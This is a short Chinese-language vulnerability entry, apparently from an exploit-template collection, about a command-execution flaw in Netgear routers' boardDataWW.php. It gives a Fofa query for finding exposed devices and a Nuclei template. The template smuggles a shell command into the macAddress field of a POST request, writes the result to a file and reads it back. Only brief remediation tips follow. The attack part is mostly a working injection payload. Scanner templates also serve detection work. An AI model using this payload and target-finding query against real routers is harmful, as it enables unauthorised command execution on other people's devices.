# netgear路由器boarddataww存在命令执行漏洞

- **系统**：netgear　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title=="Netgear"`
- **请求**：`POST /boardDataWW.php HTTP/1.1`

**请求体 / payload**
```
1. Fofa
title=="Netgear"
1. 部分界面如下
1. Nuclei
id: netgear-devices-boarddataww-rce
info:
name: netgear-devices-boarddataww-rce
author: unknow
severity: high
description: netgear路由器 boarddataww 存在命令执行漏洞。
tags: netgear,rce
metadata:
fofa-qeury: title=="Netgear"
http:
- raw:
-
Host:
Content-Type: application/x-www-form-urlencoded
macAddress=112233445566%3B{{rce}}+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit
-
GET /output HTTP/1.1
Host:
payloads:
rce:
- "id"
matchers-condition: and
matchers:
- type: dsl
dsl:
- 'status_code_2==200 && contains(body_2, "uid=") && contains(header_2, "application/octet-…（脚本共 609 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。